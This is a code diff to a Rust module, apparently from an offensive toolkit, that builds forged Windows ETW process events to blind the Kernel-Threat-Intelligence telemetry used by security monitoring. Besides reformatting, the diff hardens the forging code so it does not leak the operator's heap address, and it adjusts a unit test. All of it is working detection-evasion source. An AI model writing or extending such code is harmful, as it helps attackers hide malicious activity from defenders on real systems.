@@ -27,24 +27,22 @@
 //! - Each forge call is a `NtTraceEvent` syscall — visible to a user-mode
 //!   ETW hook. Stealthier than no events, but not invisible.
 
+use crate::KitError;
 use alloc::collections::BTreeMap;
 use alloc::vec::Vec;
-use crate::KitError;
 
 // ---- ETW event constants (Microsoft-Windows-Kernel-Process provider) ----
 
 /// Provider GUID: `Microsoft-Windows-Kernel-Process`
 /// {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}
 pub const KERNEL_PROCESS_PROVIDER_GUID: [u8; 16] = [
-    0xD6, 0x2C, 0xFB, 0x22, 0x7B, 0x0E, 0x2B, 0x42,
-    0xA0, 0xC7, 0x2F, 0xAD, 0x1F, 0xD0, 0xE7, 0x16,
+    0xD6, 0x2C, 0xFB, 0x22, 0x7B, 0x0E, 0x2B, 0x42, 0xA0, 0xC7, 0x2F, 0xAD, 0x1F, 0xD0, 0xE7, 0x16,
 ];
 
 /// Provider GUID: `Microsoft-Windows-Kernel-Threat-Intelligence`
 /// Used by ETW-TI — the primary target of the blind.
 pub const KERNEL_TI_PROVIDER_GUID: [u8; 16] = [
-    0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56,
-    0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44,
+    0x7C, 0x89, 0xE1, 0xF4, 0x5D, 0xBB, 0x68, 0x56, 0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44,
 ];
 
 /// Event ID: Process Start (1) from Microsoft-Windows-Kernel-Process.
@@ -229,11 +227,10 @@ impl EtwDeceiver {
             .copy_from_slice(&(unicode_string_len).to_le_bytes());
         // UNICODE_STRING.Padding (u32) = 0
         buf[user_data_offset + 4..user_data_offset + 8].copy_from_slice(&0u32.to_le_bytes());
-        // UNICODE_STRING.Buffer (u64) — in an ETW user-data block this is an offset
-        // from the start of the buffer. We place the raw string right after the header.
-        let string_offset = (user_data_offset + unicode_string_header_size) as u64;
-        buf[user_data_offset + 8..user_data_offset + 16]
-            .copy_from_slice(&string_offset.to_le_bytes());
+        // UNICODE_STRING.Buffer — zeroed. The UserData payload is inline
+        // immediately after this header, so no absolute VA is needed (and
+        // embedding the operator's own heap pointer here would leak it).
+        buf[user_data_offset + 8..user_data_offset + 16].copy_from_slice(&0u64.to_le_bytes());
         // Raw UTF-16LE image name bytes.
         let string_dest = user_data_offset + unicode_string_header_size;
         buf[string_dest..string_dest + image_name.len()].copy_from_slice(image_name);
@@ -508,7 +505,9 @@ mod tests {
     #[test]
     fn forge_process_stop_builds_buffer() {
         let d = EtwDeceiver::with_kernel_defaults();
-        let buf = d.forge_process_stop(42, 0x00000000, 0x01D8_B000_0000_0000).unwrap();
+        let buf = d
+            .forge_process_stop(42, 0x00000000, 0x01D8_B000_0000_0000)
+            .unwrap();
         assert!(buf.len() >= EVENT_HEADER_SIZE + 4);
 
         // Event ID = Process Stop.
